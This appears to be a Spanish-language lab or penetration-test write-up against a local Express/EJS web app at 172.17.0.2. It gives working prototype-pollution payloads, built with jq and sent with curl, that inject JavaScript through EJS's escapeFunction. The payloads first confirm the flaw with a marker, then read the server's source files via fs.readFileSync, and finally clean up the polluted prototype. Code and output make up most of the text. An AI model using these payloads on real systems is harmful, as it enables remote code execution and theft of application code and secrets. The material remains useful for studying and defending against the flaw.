# Vía sin shell — lectura del código por HTTP

Fecha: 2026-11-18  
Objetivo: `172.17.0.2`  
Propósito: demostrar que el código se puede leer a través de la propia
respuesta HTTP, sin abrir una reverse shell.

## 1. Detección

El detector `json spaces` de Express no es aplicable aquí: Express 4.18.2
recorre `app.settings` hasta antes de `Object.prototype` en `app.set()`, por lo
que ignora la propiedad heredada. Se usa un marcador inocuo en el gadget de
EJS:

```bash
jq -cn --arg e "1;return 'LEVIATHAN_PP_MARKER';" \
  '{"__proto__":{"client":true,"escapeFunction":$e}}' > /tmp/bb-marker.json

curl -s -X POST -H 'Content-Type: application/json' \
  --data @/tmp/bb-marker.json http://172.17.0.2/api/profile
curl -s http://172.17.0.2/
```

Resultado:

```text
{"status":"Profile updated"}
LEVIATHAN_PP_MARKER
```

## 2. Lectura del código

```bash
jq -cn --arg e "1;return process.mainModule.require('fs').readFileSync('/app/server.js','utf8');" \
  '{"__proto__":{"client":true,"escapeFunction":$e}}' > /tmp/bb-read-server.json

curl -s -X POST -H 'Content-Type: application/json' \
  --data @/tmp/bb-read-server.json http://172.17.0.2/api/profile
curl -s http://172.17.0.2/ -o /tmp/blackbox-server.js
```

Resultado: 1286 bytes, SHA-256 `fb22477d...`.

De la misma forma se recuperaron:

- `package.json`: 179 bytes, SHA-256 `b6ef0901...`.
- `views/index.ejs`: 7319 bytes, SHA-256 `b17d46b7...`.

Los payloads exactos están en `blackbox-marker.json`,
`blackbox-read-server.json`, `blackbox-read-package.json` y
`blackbox-read-view.json`.

## 3. Limpieza

```bash
jq -cn --arg e "1;delete Object.prototype.client;delete Object.prototype.escapeFunction;delete Object.prototype['json spaces'];delete Object.prototype.theme;delete Object.prototype.x;return '';" \
  '{"__proto__":{"client":true,"escapeFunction":$e}}' > /tmp/bb-clean.json

curl -s -X POST -H 'Content-Type: application/json' \
  --data @/tmp/bb-clean.json http://172.17.0.2/api/profile
curl -s http://172.17.0.2/ -o /dev/null -w "%{http_code} %{size_download}\n"
```

Resultado: `200 0` al disparar la limpieza. Verificación posterior:
`GET / -> 200` (7332 bytes), `GET /api/profile -> 200` (JSON compacto) y
`POST /api/profile -> 200`.
